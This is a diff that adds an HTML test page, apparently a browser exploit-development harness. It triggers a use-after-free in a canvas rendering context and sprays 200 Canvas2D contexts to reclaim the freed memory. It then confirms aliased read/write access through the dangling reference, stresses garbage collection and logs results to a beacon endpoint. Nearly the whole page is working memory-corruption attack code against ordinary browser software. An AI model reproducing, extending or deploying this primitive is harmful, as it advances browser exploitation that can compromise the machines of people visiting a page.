@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V560</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V560-'+tag+'?d='+encodeURIComponent(String(data).substring(0,400))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return {ctx:innerCtx, canvas:outer};
+}
+
+function forceGC(){
+  var junk;
+  for(var g=0;g<30;g++){
+    junk=[];for(var j=0;j<10000;j++)junk.push({a:j,b:'x'.repeat(50)});
+    junk=null;
+  }
+}
+
+b('BOOT','V560-mass-reclaim');
+
+// T1: Baseline
+(function(){
+  var c=document.createElement('canvas');c.width=1;c.height=1;
+  var ctx=c.getContext('2d');
+  ctx.save();ctx.lineWidth=42;ctx.restore();
+  b('T1','PASS-baseline');
+})();
+
+// T2: Mass reclaim + identify alias index + full R/W exercise
+(function(){
+  try{
+    var u=triggerUAF();
+    var contexts=[];
+    var canvases=[];
+    var MARKER=123.456;
+    // Create 200 Canvas2D contexts, each with unique lineWidth
+    for(var i=0;i<200;i++){
+      var c=document.createElement('canvas');c.width=1;c.height=1;
+      var ctx=c.getContext('2d');
+      ctx.lineWidth=200+i; // unique marker per context
+      contexts.push(ctx);
+      canvases.push(c);
+    }
+    // Oracle check
+    try{
+      var attrs=u.ctx.getContextAttributes();
+    }catch(e){
+      b('T2','oracle-FAIL:'+e.message);
+      return;
+    }
+    // Read lineWidth through dangling — tells us which context is the alias
+    var lw=u.ctx.lineWidth;
+    var aliasIdx=Math.round(lw-200);
+    b('T2','oracle-OK|lw='+lw+'|aliasIdx='+aliasIdx);
+
+    // WRITE through dangling, READ through alias
+    u.ctx.lineWidth=MARKER;
+    var readBack=contexts[aliasIdx].lineWidth;
+    b('T2-WR','wrote='+MARKER+'|readback='+readBack+'|match='+(readBack===MARKER));
+
+    // WRITE through alias, READ through dangling
+    contexts[aliasIdx].lineWidth=789.012;
+    var readDang=u.ctx.lineWidth;
+    b('T2-RW','wrote=789.012|readDang='+readDang+'|match='+(readDang===789.012));
+
+    // globalAlpha cross-read
+    contexts[aliasIdx].globalAlpha=0.333;
+    var gaDang=u.ctx.globalAlpha;
+    b('T2-GA','wrote=0.333|readDang='+gaDang+'|match='+(Math.abs(gaDang-0.333)<0.001));
+
+    // lineDashOffset cross-read
+    contexts[aliasIdx].lineDashOffset=2.718;
+    var ldoDang=u.ctx.lineDashOffset;
+    b('T2-LDO','wrote=2.718|readDang='+ldoDang);
+
+    // shadowBlur cross-read
+    contexts[aliasIdx].shadowBlur=15.5;
+    var sbDang=u.ctx.shadowBlur;
+    b('T2-SB','wrote=15.5|readDang='+sbDang);
+
+    // miterLimit cross-read
+    contexts[aliasIdx].miterLimit=22.7;
+    var mlDang=u.ctx.miterLimit;
+    b('T2-ML','wrote=22.7|readDang='+mlDang);
+
+    contexts=null;canvases=null;
+  }catch(e){b('T2','ERR:'+e.message)}
+})();
+
+// T3: Same mass reclaim but test GC safety — null dangling BEFORE GC
+(function(){
+  try{
+    var u=triggerUAF();
+    var contexts=[];
+    var canvases=[];
+    for(var i=0;i<200;i++){
+      var c=document.createElement('canvas');c.width=1;c.height=1;
+      var ctx=c.getContext('2d');
+      ctx.lineWidth=200+i;
+      contexts.push(ctx);
+      canvases.push(c);
+    }
+    // Verify alias exists
+    var lw=u.ctx.lineWidth;
+    var aliasIdx=Math.round(lw-200);
+    b('T3-PRE','lw='+lw+'|aliasIdx='+aliasIdx);
+
+    // Write a marker through dangling
+    u.ctx.lineWidth=999;
+
+    // NULL the dangling ref before GC
+    u.ctx=null; u=null;
+
+    // Force GC — should be safe because:
+    // 1. dangling wrapper collected → ~Ref() → deref() → m_canvas.derefCanvasBase()
+    // 2. m_canvas points to original canvas which still exists (has bitmaprenderer)
+    forceGC();
+
+    // Read through alias context — should still have 999
+    var lwPost=contexts[aliasIdx].lineWidth;
+    b('T3','POST-GC|lw='+lwPost+'|expect=999|survived=true');
+
+    contexts=null;canvases=null;
+  }catch(e){b('T3','ERR:'+e.message)}
+})();
+
+// T4: GC with dangling ref ALIVE (control — tests if wrapper survives GC when aliased)
+(function(){
+  try{
+    var u=triggerUAF();
+    var contexts=[];
+    var canvases=[];
+    for(var i=0;i<200;i++){
+      var c=document.createElement('canvas');c.width=1;c.height=1;
+      var ctx=c.getContext('2d');
+      ctx.lineWidth=200+i;
+      contexts.push(ctx);
+      canvases.push(c);
+    }
+    var lw=u.ctx.lineWidth;
+    var aliasIdx=Math.round(lw-200);
+    b('T4-PRE','lw='+lw+'|aliasIdx='+aliasIdx);
+
+    // DON'T null — keep dangling ref alive during GC
+    // GC will call visitChildren on wrapper → reads m_canvas@+32
+    // m_canvas points to new alias context's canvas (via reclaim)
+    // This SHOULD survive if m_canvas in reclaimed slot points to a valid canvas
+    forceGC();
+
+    var lwPost=u.ctx.lineWidth;
+    b('T4','POST-GC-ALIVE|lw='+lwPost+'|survived=true');
+    contexts=null;canvases=null;
+  }catch(e){b('T4','ERR:'+e.message)}
+})();
+
+// T5: Multiple GC cycles with alias
+(function(){
+  try{
+    var u=triggerUAF();
+    var contexts=[];
+    var canvases=[];
+    for(var i=0;i<200;i++){
+      var c=document.createElement('canvas');c.width=1;c.height=1;
+      var ctx=c.getContext('2d');
+      ctx.lineWidth=200+i;
+      contexts.push(ctx);
+      canvases.push(c);
+    }
+    var lw=u.ctx.lineWidth;
+    var aliasIdx=Math.round(lw-200);
+
+    // 5 GC cycles with reads between
+    var results=[];
+    for(var cycle=0;cycle<5;cycle++){
+      forceGC();
+      try{
+        var lwC=u.ctx.lineWidth;
+        results.push('gc'+cycle+':lw='+lwC);
+      }catch(e){
+        results.push('gc'+cycle+':ERR');
+        break;
+      }
+    }
+    b('T5',results.join('|'));
+    contexts=null;canvases=null;
+  }catch(e){b('T5','ERR:'+e.message)}
+})();
+
+// T6: Canvas property access through dangling — what does .canvas return?
+(function(){
+  try{
+    var u=triggerUAF();
+    var contexts=[];
+    var canvases=[];
+    for(var i=0;i<200;i++){
+      var c=document.createElement('canvas');c.width=1;c.height=1;
+      var ctx=c.getContext('2d');
+      ctx.lineWidth=200+i;
+      contexts.push(ctx);
+      canvases.push(c);
+    }
+    var lw=u.ctx.lineWidth;
+    var aliasIdx=Math.round(lw-200);
+
+    // .canvas property — does it return the original (bitmaprenderer) canvas or the alias canvas?
+    var dangCanvas=u.ctx.canvas;
+    var aliasCanvas=contexts[aliasIdx].canvas;
+    var same=(dangCanvas===aliasCanvas);
+    var dangTag=dangCanvas?dangCanvas.tagName:'null';
+    var dangW=dangCanvas?dangCanvas.width:'?';
+    b('T6','dangCanvas='+dangTag+'(w='+dangW+')|aliasCanvas='+aliasCanvas.tagName+'(w='+aliasCanvas.width+')|same='+same);
+    contexts=null;canvases=null;
+  }catch(e){b('T6','ERR:'+e.message)}
+})();
+
+// T7: fillRect through dangling — does drawing work?
+(function(){
+  try{
+    var u=triggerUAF();
+    var contexts=[];
+    var canvases=[];
+    for(var i=0;i<200;i++){
+      var c=document.createElement('canvas');c.width=10;c.height=10;
+      var ctx=c.getContext('2d');
+      ctx.lineWidth=200+i;
+      contexts.push(ctx);
+      canvases.push(c);
+    }
+    var lw=u.ctx.lineWidth;
+    var aliasIdx=Math.round(lw-200);
+
+    // Draw through dangling
+    u.ctx.fillStyle='#ff0000';
+    u.ctx.fillRect(0,0,5,5);
+
+    // Read pixels through alias
+    var imgData=contexts[aliasIdx].getImageData(2,2,1,1);
+    var px=imgData.data;
+    b('T7','fillRect|px=R'+px[0]+'G'+px[1]+'B'+px[2]+'A'+px[3]+'|expect=R255G0B0A255');
+    contexts=null;canvases=null;
+  }catch(e){b('T7','ERR:'+e.message)}
+})();
+
+// T8: save/restore through dangling
+(function(){
+  try{
+    var u=triggerUAF();
+    var contexts=[];
+    var canvases=[];
+    for(var i=0;i<200;i++){
+      var c=document.createElement('canvas');c.width=1;c.height=1;
+      var ctx=c.getContext('2d');
+      ctx.lineWidth=200+i;
+      contexts.push(ctx);
+      canvases.push(c);
+    }
+    var lw=u.ctx.lineWidth;
+    var aliasIdx=Math.round(lw-200);
+
+    // save through dangling — THIS CRASHED before without reclaim
+    u.ctx.save();
+    u.ctx.lineWidth=555;
+    u.ctx.restore();
+    var lwAfter=u.ctx.lineWidth;
+    b('T8','save-restore|lwAfter='+lwAfter+'|expect='+lw+' (restored to pre-save)');
+    contexts=null;canvases=null;
+  }catch(e){b('T8','ERR:'+e.message)}
+})();
+
+b('DONE','V560-all-complete');
+</script>
+</body></html>
